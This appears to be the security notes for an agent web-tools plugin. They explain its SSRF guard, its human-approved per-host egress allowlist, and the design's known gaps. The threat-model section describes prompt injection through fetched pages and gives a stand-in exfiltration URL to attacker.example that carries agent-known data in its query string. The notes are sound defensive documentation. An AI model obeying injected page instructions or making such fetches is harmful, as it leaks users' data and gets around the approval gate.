# @ax/web-tools — security notes

We give agents web search + page extraction without poking a single hole in the sandbox.

## Where the traffic actually goes

The sandbox can't reach the internet — that's by design, and we kept it that way.
These tools run on the **host** (`executesIn: 'host'`), and even the host doesn't
open a socket to the page: it asks **Anthropic** to do the search/fetch server-side
and hands back the results. The only outbound connection from our infrastructure is
to `api.anthropic.com`.

That's worth being precise about, because it's easy to read as more than it is.
It means we haven't added a way to reach *our* private network. It does **not**
mean nothing leaves. Which brings us to the part we used to gloss over.

## `web_extract` is an exfiltration channel, and we should say so

`web_extract` fetches whatever public URL the agent names. The site on the other
end sees that request — the path, the query string, everything in it.

Web content is untrusted, and prompt injection is the normal case on this surface,
not the exotic one. A page the agent reads can tell it to read another page. If
that second URL is `https://attacker.example/?x=<something the agent knows>`, the
data is gone the moment the fetch happens. There is no taking it back, and no
amount of "the fetch ran on Anthropic's network, not ours" changes that.

So we treat the destination as the thing to control.

## Two layers, and they stack

**Underneath: the SSRF guard** (`url-guard.ts`). Refuses non-`http(s)` schemes and
internal, private, loopback, link-local and metadata addresses. It runs first, on
every call, and it is not overridable — a private address stays refused even if
somebody put that exact host on the allowlist below. The allowlist sits *above*
this guard, never instead of it.

**On top: the egress allowlist** (owned by `@ax/tool-policy`, not by us). For any
public host that clears the guard:

- **On the list** → the read happens silently. No prompt.
- **Not on the list** → the call is **held** for approval. A person sees it and
  decides.
- **Approved** → we remember that host for *that person* (scope `user`), so the
  next read from it doesn't ask again.
- **Changed your mind?** Settings → Connectors → **Sites we read without asking**
  lists every site you've allowed, plus any your admin pre-approved for everyone.
  Press **Ask again** on one and we go back to asking. A permission you can't find
  and can't take back isn't really a permission, so this list is part of the
  feature rather than a nicety bolted on later.

That last step is the only part `@ax/web-tools` implements. After a fetch
succeeds — never before it, never when it fails — we call
`egress-allowlist:remember` with the bare hostname and nothing else. No path, no
query string, no scheme. The owner is taken from the request context, so this
plugin can't file an entry on anyone else's behalf. If the recording fails, we log
a warning (naming the host, never the URL — see above re: query strings) and carry
on. The cost of forgetting is one extra approval next time. It grants nothing.

Operators who already know which sites their agents need can pre-seed a shared
list: `createToolPolicyPlugin({ globalEgressHosts: ['docs.example.com', …] })`.

## Why an empty default is safe here

The allowlist ships empty, and we'd rather it stayed that way until a real person
puts something on it. That's only tolerable because **a miss holds, it doesn't
refuse**. Nothing breaks on a fresh install. The first read of a new site asks
once; after that it's quiet. The list earns its entries.

Please don't "fix" the empty default by seeding it with something permissive. The
gate is the whole feature.

## What this does not fix

Being honest about the edges:

- **The allowlist is per-host, not per-URL.** Once a person approves
  `example.com`, every later read from `example.com` is silent — including one
  with an attacker-chosen query string. If a site can be made to log arbitrary
  paths, approving it approves that too. The list above is how you undo it: press
  **Ask again** and the next read from that host is held for approval. Undoing it
  doesn't retroactively un-send anything that already went out, and we're not
  going to pretend otherwise.
- **The first read is the one that matters, and a human is in that loop.** An
  approval prompt is only as good as the attention behind it. That's exactly why
  the rule holds on *new hosts* rather than on every page read: a prompt on every
  read is one people learn to click through.
- **We don't inspect fetched content on the host.** It flows back to the agent as
  tool output, which the agent already treats as untrusted. The fetch itself runs
  in an isolated, minimal-context call ("fetch this URL") so a malicious page
  can't see the agent's transcript or any secrets — but it can still say things,
  and the agent can still act on them.

## Operational note

Web search must be enabled once by an org admin in the Claude Console. Web search
bills ~$10 per 1,000 searches; `web_extract` has no per-fetch fee. The whole plugin
can be turned off with `createWebToolsPlugin({ enabled: false })`.

In a preset that doesn't load `@ax/tool-policy` (the CLI, today), the
`egress-allowlist:remember` hook simply isn't there. We detect that and skip the
recording — which is correct, because in that preset nothing is holding page reads
to begin with. The manifest declares the hook as an `optionalCall` with that
degradation written down.
